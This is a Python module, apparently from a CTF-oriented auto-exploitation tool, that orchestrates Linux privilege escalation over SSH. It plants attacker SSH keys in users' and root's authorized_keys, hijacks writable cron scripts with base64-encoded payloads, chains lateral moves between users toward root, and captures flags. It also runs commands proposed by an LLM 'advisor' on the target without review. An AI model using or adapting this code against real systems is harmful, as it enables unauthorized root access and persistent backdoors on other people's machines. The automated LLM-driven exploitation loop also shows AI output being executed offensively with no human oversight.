"""Deterministic kill-chain orchestrator with multi-hop lateral movement.

Flow per identity: enumerate -> capture any readable flags -> analyze -> execute
vectors. Root-exec/read vectors verify root and grab the root flag; lateral
(sudo-as-user) vectors plant an ephemeral SSH key and re-enter as that user,
recursing toward root. If every deterministic vector fails, a scoped LLM advisor
is consulted (enriched with custom-SUID strings). Everything is code-driven.
"""
from __future__ import annotations

import base64
import datetime as dt
import shlex
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path

from . import advisor, gtfobins as g
from .analyze import Vector, analyze
from .enumerate import FLAG_RE, enumerate_target, run_remote
from ..ssh import write_wrapper


def _flags(text: str) -> set[str]:
    return set(FLAG_RE.findall(text))


def _upload(wrapper: Path, path: str, content: str) -> bool:
    b64 = base64.b64encode(content.encode()).decode()
    cmd = f"echo {b64} | base64 -d > {path} && chmod 755 {path} && echo OK_UP"
    _, out = run_remote(wrapper, cmd, 30)
    return "OK_UP" in out


def _plant_script(home: str, pubkey: str) -> str:
    return (
        "#!/bin/sh\n"
        f'H="{home}"\n'
        'mkdir -p "$H/.ssh" 2>/dev/null\n'
        f'printf "%s\\n" "{pubkey}" >> "$H/.ssh/authorized_keys" 2>/dev/null\n'
        'chmod 700 "$H/.ssh" 2>/dev/null; chmod 600 "$H/.ssh/authorized_keys" 2>/dev/null\n'
        "id\n"
    )


@dataclass
class Engine:
    base_wrapper: Path
    workdir: Path
    host: str
    port: int
    model: str
    use_advisor: bool
    advisor_rounds: int
    cron_wait: int
    chain_depth: int

    flags: set[str] = field(default_factory=set)
    attempts: list[str] = field(default_factory=list)
    findings: list[dict] = field(default_factory=list)
    report: list[str] = field(default_factory=list)
    visited: set[str] = field(default_factory=set)
    homes: dict[str, str] = field(default_factory=dict)
    rooted: bool = False
    chain_key: Path | None = None
    pubkey: str = ""

    # ---- helpers ----
    def log(self, ok: bool, msg: str) -> None:
        mark = "+" if ok else "-"
        self.attempts.append(f"[{mark}] {msg}")
        print(f"  [{mark}] {msg}")

    def _finding(self, v: Vector, status: str, user: str) -> None:
        self.findings.append({"severity": v.severity, "status": status,
                              "title": v.title, "category": v.kind, "user": user})

    def _gen_chain_key(self) -> None:
        self.chain_key = self.workdir / "chain_key"
        if not self.chain_key.exists():
            subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "",
                            "-f", str(self.chain_key)], check=False)
        pub = self.chain_key.with_suffix(".pub")
        self.pubkey = pub.read_text().strip() if pub.exists() else ""

    def _home_of(self, user: str) -> str:
        return "/root" if user == "root" else self.homes.get(user, f"/home/{user}")

    def _parse_homes(self, enum) -> None:
        for line in enum.get("HOMES").splitlines():
            parts = line.split()
            if len(parts) >= 9 and parts[0].startswith("d"):
                name = parts[-1]
                if name not in (".", ".."):
                    self.homes[name] = f"/home/{name}"

    # ---- exec wrapper: run arbitrary commands as an escalated identity -------
    def _exec_wrapper(self, parent: Path, runner_tmpl: str, label: str) -> Path:
        """Write a bash wrapper that runs its $1 as the escalated identity by
        base64-piping it through the escalation primitive (runner), chaining the
        parent wrapper. Avoids all nested-quoting problems and works recursively.
        """
        rb64 = base64.b64encode(runner_tmpl.encode()).decode()
        w = self.workdir / f"ssh_{label}.sh"
        w.write_text(
            "#!/usr/bin/env bash\n"
            'B=$(printf "%s" "$1" | base64 | tr -d "\\n")\n'
            'S="echo $B | base64 -d | /bin/sh"\n'
            "SQ=\"'$S'\"\n"
            'DQ="\\"$S\\""\n'
            f"RUNNER=$(echo {rb64} | base64 -d)\n"
            'CMD="${RUNNER//@SQ@/$SQ}"\n'
            'CMD="${CMD//@DQ@/$DQ}"\n'
            f'exec "{parent}" "$CMD"\n'
        )
        w.chmod(0o755)
        return w

    # ---- vector execution ----
    def _exec_root(self, wrapper: Path, v: Vector) -> bool:
        if v.runner:
            w = self._exec_wrapper(wrapper, v.runner, f"root_{v.kind}")
            _, out = run_remote(w, g.PROOF_CMD, 60)
        else:  # fallback: upload proof script and run the templated command
            _upload(wrapper, g.PROOF_PATH, g.PROOF_SCRIPT)
            _, out = run_remote(wrapper, v.template.replace("{cmd}", g.PROOF_PATH), 60)
        got = _flags(out)
        self.flags |= got
        if "uid=0(root)" in out:
            self.log(True, f"{v.title} -> ROOT")
            self.report.append(f"### Root via: {v.title}\n- `{v.runner or v.template}`\n- {v.note}")
            self.rooted = True
            return True
        if got:
            self.log(True, f"{v.title} -> captured flag(s)")
            return True
        self.log(False, f"{v.title} -> no root")
        return False

    def _exec_read(self, wrapper: Path, v: Vector) -> bool:
        _, out = run_remote(wrapper, v.template, 60)
        got = _flags(out)
        if got:
            self.flags |= got
            self.log(True, f"{v.title} -> captured {len(got)} flag(s)")
            self.report.append(f"### Flag read via: {v.title}\n- `{v.template}`")
            return True
        self.log(False, f"{v.title} -> nothing")
        return False

    def _exec_tick(self, wrapper: Path, v: Vector) -> bool:
        # Build the root payload and base64 it so no quoting survives into the
        # target script (a naive echo breaks on the key's own characters).
        inject = (f'mkdir -p /root/.ssh; '
                  f'printf "%s\\n" "{self.pubkey}" >> /root/.ssh/authorized_keys; '
                  f'chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys')
        b64 = base64.b64encode(inject.encode()).decode()
        line = f"echo {b64} | base64 -d | sh"
        append = f"printf '%s\\n' {shlex.quote(line)} >> {v.target}"
        run_remote(wrapper, append, 20)
        self.log(True, f"payload appended to {v.target}; waiting up to {self.cron_wait}s for cron")
        root_w = self._wrapper_for("root")
        deadline = time.time() + self.cron_wait
        while time.time() < deadline:
            time.sleep(10)
            rc, out = run_remote(root_w, g.PROOF_PATH + "; id", 20)
            if "uid=0(root)" in out:
                self.flags |= _flags(out)
                self.log(True, f"cron fired -> ROOT via {v.target}")
                self.report.append(f"### Root via writable cron: {v.target}")
                self.rooted = True
                return True
        self.log(False, f"cron did not fire within {self.cron_wait}s")
        return False

    def _wrapper_for(self, user: str) -> Path:
        return write_wrapper(self.workdir, self.host, user, self.port,
                             self.chain_key, None, name=f"ssh_{user}.sh")

    def _become(self, wrapper: Path, v: Vector, user: str) -> Path | None:
        if not v.runner:
            self.log(False, f"{v.title} -> no runner to become {user}")
            return None
        w = self._exec_wrapper(wrapper, v.runner, user)
        _, out = run_remote(w, "id", 30)
        if f"({user})" in out or (f"uid=" in out and user in out):
            self.log(True, f"{v.title} -> became {user}")
            self.report.append(f"### Lateral: {v.title} -> {user}")
            return w
        self.log(False, f"{v.title} -> could not become {user} ({out.strip()[:80]})")
        return None

    # ---- main recursion ----
    def escalate(self, wrapper: Path, user: str, depth: int) -> None:
        if self.rooted or depth > self.chain_depth or user in self.visited:
            return
        self.visited.add(user)
        print(f"[*] Enumerating as {user} (depth {depth}) ...")
        enum = enumerate_target(wrapper)
        self._parse_homes(enum)
        new = set(enum.flags) - self.flags
        if new:
            self.flags |= new
            print(f"[+] Flags readable as {user}: {', '.join(sorted(new))}")
        if enum.is_root:
            self.rooted = True
            self.flags |= _flags(run_remote(wrapper, g.PROOF_PATH)[1])
            return

        vectors = analyze(enum)
        leads = [v for v in vectors if not v.auto]
        print(f"[*] {sum(v.auto for v in vectors)} auto vector(s), {len(leads)} lead(s) as {user}")

        for v in vectors:
            if not v.auto:
                self._finding(v, "identified", user)
                continue
            if self.rooted:
                self._finding(v, "identified", user)
                continue
            if v.effect == "read":
                ok = self._exec_read(wrapper, v)
                self._finding(v, "exploited" if ok else "attempted", user)
            elif v.effect == "tick":
                ok = self._exec_tick(wrapper, v)
                self._finding(v, "exploited" if ok else "attempted", user)
            elif v.effect == "exec" and v.runas == "root":
                ok = self._exec_root(wrapper, v)
                self._finding(v, "exploited" if ok else "attempted", user)
            elif v.effect == "exec":  # lateral to another user
                child = self._become(wrapper, v, v.runas)
                self._finding(v, "exploited" if child is not None else "attempted", user)
                if child is not None:
                    self.escalate(child, v.runas, depth + 1)

        if not self.rooted and self.use_advisor and depth == 0:
            self._advise(enum, wrapper, user)

    # ---- LLM advisor fallback (scoped) ----
    def _advise(self, enum, wrapper: Path, user: str = "") -> None:
        print("[*] Deterministic vectors exhausted — consulting LLM advisor ...")
        ctx = advisor.build_context(enum)
        # enrich with custom-SUID artifacts
        extras = []
        for v in analyze(enum):
            if v.target and "custom SUID" in v.title:
                _, info = run_remote(wrapper, f"file {v.target}; strings -n 6 {v.target} 2>/dev/null | head -60", 30)
                extras.append(f"## {v.target}\n{info}")
        if extras:
            ctx += "\n\n# Custom SUID binary analysis\n" + "\n\n".join(extras)
        for _ in range(self.advisor_rounds):
            for c in advisor.advise(ctx, model=self.model):
                _, out = run_remote(wrapper, c, 60)
                ok = "uid=0(root)" in out
                self.flags |= _flags(out)
                self.log(ok or bool(_flags(out)), f"(advisor) {c[:70]}")
                self.findings.append({
                    "severity": "critical" if ok else "medium",
                    "status": "exploited" if ok else "attempted",
                    "title": f"LLM advisor: {c[:70]}", "category": "advisor",
                    "user": user})
                if ok:
                    self.rooted = True
                    self.report.append(f"### Root via LLM advisor\n- `{c}`")
                    return

    # ---- report ----
    def write_report(self, start_user: str) -> int:
        rc = 0 if (self.rooted or self.flags) else 1
        ts = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        flags_md = "\n".join(f"- `{f}`" for f in sorted(self.flags)) or "- (none captured)"
        result = ("ROOT shell achieved" if self.rooted
                  else "flag(s) captured, no root shell" if self.flags
                  else "root NOT achieved")
        # dedupe findings by (title, user), preferring the strongest status
        rank_s = {"exploited": 0, "attempted": 1, "identified": 2}
        best: dict[tuple, dict] = {}
        for f in self.findings:
            key = (f["title"], f["user"])
            if key not in best or rank_s[f["status"]] < rank_s[best[key]["status"]]:
                best[key] = f
        sev_rank = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        findings = sorted(best.values(),
                          key=lambda f: (rank_s[f["status"]], sev_rank.get(f["severity"], 2)))
        findings_md = "\n".join(
            f"- [{f['severity']}][{f['status']}] {f['title']} :: {f['user']}"
            for f in findings) or "- (none)"

        (self.workdir / "REPORT.md").write_text(
            f"# detpwn report\n\nGenerated: {ts}\nStart user: {start_user}\n"
            f"Users traversed: {', '.join(sorted(self.visited)) or '-'}\n\n"
            f"## Result\n\n{result}\n\n## Flags\n\n{flags_md}\n\n"
            f"## Findings\n\n{findings_md}\n\n"
            f"## Attempts\n\n" + ("\n".join(self.attempts) or "- (none)") +
            "\n\n## Analysis\n\n" + ("\n\n".join(self.report) or "- (none)") + "\n"
        )
        print("-" * 60)
        print(f"[{'+' if rc == 0 else 'x'}] {result}")
        if self.flags:
            print("[*] Flags: " + ", ".join(sorted(self.flags)))
        print(f"[*] Report: {self.workdir / 'REPORT.md'}")
        return rc


def run_engagement(*, wrapper: Path, workdir: Path, host: str, port: int, user: str,
                   model: str, use_advisor: bool, advisor_rounds: int,
                   cron_wait: int = 120, chain_depth: int = 6) -> int:
    eng = Engine(base_wrapper=wrapper, workdir=workdir, host=host, port=port,
                 model=model, use_advisor=use_advisor, advisor_rounds=advisor_rounds,
                 cron_wait=cron_wait, chain_depth=chain_depth)
    eng._gen_chain_key()
    eng.escalate(wrapper, user, depth=0)
    return eng.write_report(user)
